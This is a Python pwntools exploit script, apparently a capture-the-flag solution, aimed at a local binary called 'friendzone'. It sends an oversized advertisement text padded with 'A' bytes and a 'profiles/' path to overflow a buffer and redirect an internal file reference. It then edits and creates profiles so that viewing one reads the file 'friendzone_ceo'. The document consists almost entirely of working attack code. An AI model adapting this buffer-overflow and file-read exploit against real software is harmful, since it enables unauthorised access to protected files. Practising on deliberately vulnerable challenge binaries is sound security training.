from pwn import *

def fetch_user_id(response):
    m = re.search('\(profile_id:(\d+)\)', response.decode('utf-8'))
    if m:
        return m.group(1)
    error("Failed to extract new profile_id!")
    exit(1)

def run_exploit(io):
    advertisement_id = '1001'
    target_file = 'friendzone_ceo'
    delim1 = b'\ncmd>'

    # Submit a post to an advertisement
    io.recvuntil(delim1)
    io.sendline(f"POST {advertisement_id}")
    io.recv()

    ad_text_size = 0x0f00
    payload = b"".join([
        b"A" * ad_text_size,
        b"profiles/\x00"
    ])
    io.sendline(payload)
    io.recvuntil(delim1)

    # Update the advertisement_id structure to point to the file we wish to read from
    io.sendline(f"EDIT_PROFILE {advertisement_id}")
    io.recv()
    io.sendline(target_file)
    io.recvuntil(delim1)

    # Create a new profile to link the profile with the new "Advertisement" so that we can read our file.
    # We cannot simply use an older profile because the link is corrupt.
    dummy_name = 'r0kit'
    dummy_city = 'pwntown'
    dummy_gender = 'A'
    dummy_age = '9001'
    io.sendline('CREATE_PROFILE personal')
    io.recv()
    io.sendline(dummy_name)
    io.recv()
    io.sendline(dummy_city)
    io.recv()
    io.sendline(dummy_gender)
    io.recv()
    io.sendline(dummy_age)
    io.recv()
    io.sendline(target_file)
    response = io.recv()
    user_id = fetch_user_id(response)

    # Profit
    io.sendline(f"VIEW_PROFILE {user_id}")
    io.interactive()


# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './friendzone'

# Start the process
io = process(PROCESS)

# Attach a debugger
gdbscript = "b Advertisement::GetAdText()"
# pid = gdb.attach(io, gdbscript=gdbscript)

run_exploit(io)
